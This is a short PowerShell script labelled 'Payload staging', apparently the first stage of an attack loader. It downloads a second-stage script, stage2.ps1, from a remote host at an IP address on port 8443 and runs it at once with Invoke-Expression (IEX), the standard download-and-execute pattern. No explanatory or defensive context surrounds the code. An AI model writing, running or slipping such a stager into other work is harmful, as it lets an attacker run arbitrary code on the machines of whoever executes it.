<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://192.0.2.33:8443/stage2.ps1",
    [int]$RequestTimeout = 44
)
IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing).Content
$StageMarker = "stage-35"
